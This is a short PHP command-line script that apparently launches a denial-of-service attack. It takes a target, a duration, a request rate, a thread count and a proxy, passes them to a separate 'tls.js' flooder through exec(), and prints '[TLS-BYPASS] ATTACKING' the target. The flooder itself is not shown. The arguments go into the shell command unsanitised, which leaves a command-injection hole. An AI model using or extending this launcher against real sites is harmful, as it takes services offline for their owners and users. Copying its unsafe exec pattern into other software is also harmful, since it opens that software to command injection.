#!/usr/bin/php
<?php

if ($argc < 3) {
    exit('Usage: php script.php [TARGET] [TIME] [RATE] [THREADS] [PROXY]' . PHP_EOL);
}

$target = $argv[1];
$time = $argv[2];
$rate = isset($argv[3]) ? $argv[3] : 64;
$threads = isset($argv[4]) ? $argv[4] : 5;
$proxy = isset($argv[5]) ? $argv[5] : '';

exec("node tls.js $target $time $rate $threads $proxy");

echo "[TLS-BYPASS] ATTACKING $target for $time seconds SUCCESS !" . PHP_EOL;
?>
